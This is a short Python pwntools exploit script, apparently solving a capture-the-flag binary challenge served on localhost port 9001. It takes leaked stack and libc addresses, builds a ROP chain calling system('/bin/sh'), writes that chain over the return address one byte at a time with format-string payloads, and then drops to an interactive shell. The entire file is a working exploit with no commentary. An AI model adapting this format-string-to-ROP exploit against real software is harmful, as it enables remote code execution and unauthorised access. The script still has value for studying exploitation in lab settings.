#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./task", checksec=False)
context.binary = elf

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)

#p = elf.process()
#p = elf.debug(gdbscript="")
p = remote("127.0.0.1", 9001)

leak1 = int(p.readline().decode(), 16)
retaddr = leak1 + 0x118

leak2 = int(p.readline().decode(), 16)
libc.address = leak2 - libc.sym["setbuf"]

rop = ROP(libc)
rop.rdi = p64(next(libc.search(b"/bin/sh\x00")))
rop.raw(p64(rop.find_gadget(['ret']).address)) # stack aligning ret
rop.call("system")
payload = rop.chain()

for i in range(len(payload)):
    p.sendline(fmtstr_payload(8, {retaddr + i: p8(payload[i])}))
    p.read()

for i in range(64 - len(payload)):
    p.sendline(b"")
    p.read()

p.clean()

p.interactive()
